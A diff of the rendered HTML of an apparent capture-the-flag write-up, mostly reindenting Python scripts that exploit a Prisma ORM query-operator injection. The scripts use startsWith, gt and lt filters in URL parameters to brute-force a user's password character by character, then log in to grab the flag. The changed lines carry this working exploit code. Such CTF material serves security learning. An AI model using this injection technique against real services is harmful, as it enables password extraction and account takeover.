@@ -1451,7 +1451,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="2654 words"
+  title="2669 words"
 >
   <em>14 min</em> read</span>
 
@@ -2109,8 +2109,8 @@ I tried <code class="language-plaintext highlighter-rouge">b</code>, <code class
 
   <summary>brute.py</summary>
 
-  <div class="language-py highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+  <div file="brute.py" class="language-py highlighter-rouge"><div class="code-header">
+        <span data-label-text="brute.py"><i class="far fa-file-code fa-fw"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -2148,21 +2148,21 @@ I tried <code class="language-plaintext highlighter-rouge">b</code>, <code class
 
 <span class="c1"># We know that the password is maximum 24 char (see seed.js)
 </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
-	<span class="c1"># Go through every possible char of the set of character
-</span>	<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
-		<span class="c1"># Make the url
-</span>		<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
-		<span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="c1"># Go through every possible char of the set of character
+</span>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="c1"># Make the url
+</span>        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
+        <span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 
-		<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-		<span class="c1"># If something is returned, that means that it's the correct char
-</span>		<span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
-			<span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
-			<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FOUND: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
-			<span class="k">break</span>
-	<span class="k">else</span><span class="p">:</span>
-		<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
+        <span class="c1"># If something is returned, that means that it's the correct char
+</span>        <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
+            <span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FOUND: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
 </pre></td></tr></tbody></table></code></div>  </div>
 
 </details>
@@ -2203,11 +2203,11 @@ And fortunately, prisma comes with a ton of operator. To mitigate the case-insne
 6
 7
 </pre></td><td class="rouge-code"><pre><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
-	</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bob"</span><span class="p">,</span><span class="w">
-	</span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
-		</span><span class="nl">"gt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8a"</span><span class="p">,</span><span class="w">
-		</span><span class="nl">"lt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8z"</span><span class="w">
-	</span><span class="p">}</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bob"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"gt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8a"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"lt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8z"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
 </span><span class="p">}</span><span class="w">
 </span></pre></td></tr></tbody></table></code></div></div>
 
@@ -2261,20 +2261,20 @@ We can repeat the operation for every character. So I scripted it:</p>
 
 <span class="n">to_test</span> <span class="o">=</span> <span class="sh">""</span>
 <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">passw</span><span class="p">:</span>
-	<span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
-		<span class="k">continue</span>
+    <span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
+        <span class="k">continue</span>
 
-	<span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>
+    <span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>
 
-	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-	<span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>
+    <span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>
 
-	<span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_uppercase</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
-	<span class="k">else</span><span class="p">:</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>
+    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_uppercase</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>
 
 <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Password with correct case is: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">to_test</span><span class="p">)</span>
 </pre></td></tr></tbody></table></code></div>  </div>
@@ -2370,14 +2370,17 @@ We can repeat the operation for every character. So I scripted it:</p>
 72
 73
 74
+75
+76
+77
 </pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">get</span><span class="p">,</span> <span class="n">post</span>
 <span class="kn">from</span> <span class="n">sys</span> <span class="kn">import</span> <span class="n">argv</span>
 <span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span>
 <span class="kn">import</span> <span class="n">re</span>
 
 <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">):</span>
-	<span class="n">log</span><span class="p">.</span><span class="nf">critical</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;USERNAME&gt;</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">exit</span><span class="p">()</span>
+    <span class="n">log</span><span class="p">.</span><span class="nf">critical</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;USERNAME&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">()</span>
 
 <span class="c1"># Set of character used (read the seeder.js file)
 # But since it's case unsensitive we don't have to check for a and A b and B ...
@@ -2394,21 +2397,22 @@ We can repeat the operation for every character. So I scripted it:</p>
 
 <span class="c1"># We know that the password is maximum 24 char (see seeder.js)
 </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
-	<span class="c1"># Go through every possible char of the set of character
-</span>	<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
-		<span class="c1"># Make the url
-</span>		<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
-		<span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-
-		<span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-		<span class="c1"># If something is returned, that means that it's the correct char
-</span>		<span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
-			<span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
-			<span class="k">break</span>
-	<span class="k">else</span><span class="p">:</span>
-		<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL (CASE-UNSENSITIVE): </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
-		<span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-		<span class="k">break</span>
+    <span class="c1"># Go through every possible char of the set of character
+</span>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+    
+    	<span class="c1"># Make &amp; Request the url
+</span>        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
+        <span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>    
+    
+    	<span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    	<span class="c1"># If something is returned, that means that it's the correct char
+</span>        <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
+            <span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL (CASE-UNSENSITIVE): </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">break</span>
 
 
 <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Gathering case ...</span><span class="sh">"</span><span class="p">)</span>
@@ -2416,33 +2420,35 @@ We can repeat the operation for every character. So I scripted it:</p>
 <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">'</span><span class="s">Identifying case</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">to_test</span> <span class="o">=</span> <span class="sh">""</span>
 <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">passw</span><span class="p">:</span>
-	<span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
-		<span class="k">continue</span>
+    <span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
+        <span class="k">continue</span>
 
-	<span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>
-	<span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>
+    <span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>
+    <span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>
 
-	<span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
 
-	<span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_lower</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
-	<span class="k">else</span><span class="p">:</span>
-		<span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>
+    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_lower</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>
 
 <span class="n">p</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">trying: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">to_test</span><span class="p">)</span>
 <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL (CASE-SENSITIVE): </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
 
 <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">searching flag in </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="sh">'</span><span class="s">s posts</span><span class="sh">"</span><span class="p">)</span>
 
-<span class="n">res</span> <span class="o">=</span> <span class="nf">post</span><span class="p">(</span>
+<span class="c1"># Login to the /api/login endpoint
+</span><span class="n">res</span> <span class="o">=</span> <span class="nf">post</span><span class="p">(</span>
 	<span class="n">url</span><span class="o">=</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/login</span><span class="sh">"</span><span class="p">,</span> 
 	<span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">},</span>
 	<span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">to_test</span><span class="p">}</span>
 <span class="p">).</span><span class="n">text</span>
 
-<span class="nf">if</span><span class="p">(</span><span class="sh">"</span><span class="s">The Flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">):</span>
+<span class="c1"># Grab the flag
+</span><span class="nf">if</span><span class="p">(</span><span class="sh">"</span><span class="s">The Flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">):</span>
 	<span class="nf">print</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">"</span><span class="s">uoftctf{.*}</span><span class="sh">"</span><span class="p">,</span> <span class="n">res</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
 </pre></td></tr></tbody></table></code></div>  </div>
 </details>
